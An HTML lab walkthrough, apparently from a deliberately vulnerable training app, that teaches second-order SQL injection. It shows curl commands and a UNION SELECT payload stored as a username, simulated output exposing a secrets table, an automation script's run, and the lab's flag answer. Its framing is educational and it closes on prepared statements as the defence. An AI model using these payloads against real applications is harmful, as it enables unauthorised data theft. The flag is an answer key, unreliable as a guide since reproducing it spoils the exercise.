<h4>Step 1: Register a Normal User</h4>
<p>
    Start by registering a normal user (e.g., <code>testuser</code> / <code>test123</code>).
    After registration, the profile page loads and shows your username, password, and bio.
    Everything works as expected.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Registration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
        &nbsp;&nbsp;-X POST "http://localhost/SQLi-Arena/mysql/lab18" -d "action=register" \<br>
        &nbsp;&nbsp;--data-urlencode "reg_username=testuser" --data-urlencode "reg_password=test123"<br><br>
        <span class="prompt">Register: </span>username=testuser, password=test123<br><br>
        <span class="prompt">INSERT: </span>INSERT INTO users (username, password, bio) VALUES ('testuser', 'test123', 'New user')<br><br>
        <span class="prompt">Profile Query 1: </span>SELECT id, username, password, bio FROM users WHERE id = 24<br>
        <span class="prompt">Profile Query 2: </span>SELECT username, password, bio FROM users WHERE username = 'testuser'<br><br>
        <span class="prompt">Result: </span>Registered successfully! User ID: 24. You are now logged in.<br>
        <span class="prompt">Profile: </span>Username: testuser | Password: test123 | Bio: New user
    </div>
</div>

<h4>Step 2: Understand the Two-Query Pattern</h4>
<p>
    Notice the profile page executes <strong>two queries</strong>:
</p>
<ol>
    <li><strong>Query 1 (safe):</strong> Fetches the user by integer ID: <code>WHERE id = 4</code></li>
    <li><strong>Query 2 (vulnerable):</strong> Uses the stored <code>username</code> from Query 1
        directly in a new query: <code>WHERE username = '$stored_username'</code></li>
</ol>
<p>
    The registration uses <code>mysqli_real_escape_string()</code>, which escapes quotes for the INSERT.
    But the <em>stored</em> value in the database contains the original unescaped payload.
    When Query 2 uses this stored value, the quotes are &ldquo;live&rdquo; again.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Understanding the Flow</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Registration: </span>Input is escaped with mysqli_real_escape_string() &rarr; INSERT is SAFE<br>
        <span class="prompt">Storage: </span>The database stores the LITERAL payload string (unescaped)<br>
        <span class="prompt">Profile Load: </span>The stored username is read and used in Query 2 WITHOUT escaping<br>
        <span class="prompt">Result: </span>The payload in the stored username EXECUTES in Query 2
    </div>
</div>

<h4>Step 3: Register with a Malicious Username</h4>
<p>
    Log out (if logged in), then register a new user with a UNION injection payload as the username.
    The profile query returns 3 columns (<code>username, password, bio</code>), so we need 3 values.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Malicious Registration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
        &nbsp;&nbsp;-X POST "http://localhost/SQLi-Arena/mysql/lab18" -d "action=register" \<br>
        &nbsp;&nbsp;--data-urlencode "reg_username=' UNION SELECT flag_text, 2, 3 FROM secrets -- -" \<br>
        &nbsp;&nbsp;--data-urlencode "reg_password=anything"<br><br>
        <span class="prompt">Username: </span>' UNION SELECT flag_text, 2, 3 FROM secrets -- -<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">INSERT Query: </span>INSERT INTO users (username, password, bio) VALUES ('\' UNION SELECT flag_text, 2, 3 FROM secrets -- -', 'anything', 'New user')<br><br>
        <span class="prompt">Result: </span>Registered successfully! User ID: 26. You are now logged in.<br>
        <span class="prompt">Note: </span>The quote is escaped to \' for the INSERT -- the INSERT succeeds.<br>
        <span class="prompt">Stored in DB: </span>' UNION SELECT flag_text, 2, 3 FROM secrets -- -
    </div>
</div>

<h4>Step 4: View Profile. Trigger Second-Order Injection</h4>
<p>
    After registration, you are automatically logged in. The profile page loads and executes the
    second query using the stored username: and the injection fires.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Second-Order Trigger</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -c /tmp/lab18.txt -b /tmp/lab18.txt \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab18"<br><br>
        <span class="prompt">Query 1 (safe): </span>SELECT id, username, password, bio FROM users WHERE id = 26<br>
        <span class="prompt">Stored username: </span>' UNION SELECT flag_text, 2, 3 FROM secrets -- -x1774337821<br><br>
        <span class="prompt">Query 2 (VULNERABLE): </span>SELECT username, password, bio FROM users WHERE username = '' UNION SELECT flag_text, 2, 3 FROM secrets -- -x1774337821'<br><br>
        <span class="prompt">MySQL sees: </span><br>
        &nbsp;&nbsp;1. SELECT ... WHERE username = '' &rarr; empty result (no user with empty name)<br>
        &nbsp;&nbsp;2. UNION SELECT flag_text, 2, 3 FROM secrets &rarr; returns the flag!<br><br>
        <span class="prompt">Result: </span><br>
        &nbsp;&nbsp;Username: <strong>FLAG{s3c0nd_0rd3r_st0r3d}</strong><br>
        &nbsp;&nbsp;Password: 2<br>
        &nbsp;&nbsp;Bio: 3
    </div>
</div>

<h4>Step 5: Submit the Flag</h4>
<p>
    Copy the flag from the profile results and paste it into the verification form:
    <code>FLAG{s3c0nd_0rd3r_st0r3d}</code>.
</p>

<h4>Step 6: Why This Matters</h4>
<p>
    Second-order injection is especially dangerous because:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Why Second-Order Injection is Dangerous</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>The input point (registration) and the trigger point (profile) are DIFFERENT pages/actions.<br>
        <span class="prompt">2. </span>Standard input validation and escaping on INSERT do NOT prevent it.<br>
        <span class="prompt">3. </span>Automated scanners often miss it because the injection doesn't fire immediately.<br>
        <span class="prompt">4. </span>The time gap between storage and trigger can be hours, days, or months.<br>
        <span class="prompt">5. </span>Only parameterized queries (prepared statements) on EVERY query prevent it.
    </div>
</div>

<h4>Step 7: Python Automation Script</h4>
<p>
    Automate the full register-and-trigger flow with this Python script. It handles
    session management, registration, and profile loading in a single run:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Python Automation (lab18_second_order.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab18_second_order.py http://localhost/SQLi-Arena<br><br>
        <span class="prompt">[*] </span>Step 1: Logging out any existing session...<br>
        <span class="prompt">[*] </span>Step 2: Registering with payload username...<br>
        <span class="prompt">&nbsp;&nbsp;</span>Username: ' UNION SELECT flag_text, 2, 3 FROM secrets -- -<br>
        <span class="prompt">[+] </span>Registration successful!<br>
        <span class="prompt">[*] </span>Step 3: Loading profile page (triggers second-order injection)...<br><br>
        <span class="prompt">[+] </span>Flag: FLAG{s3c0nd_0rd3r_st0r3d}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab18_second_order.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab18_second_order.py')); ?></pre></div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Escaping input on INSERT is <em>not sufficient</em>.
    Every SQL query that uses stored data must also use <strong>prepared statements</strong>.
    Second-order injection exploits the gap between safe storage and unsafe retrieval.
    The only reliable defense is using parameterized queries for <strong>all</strong> database operations,
    not just the ones that directly handle user input.
</div>
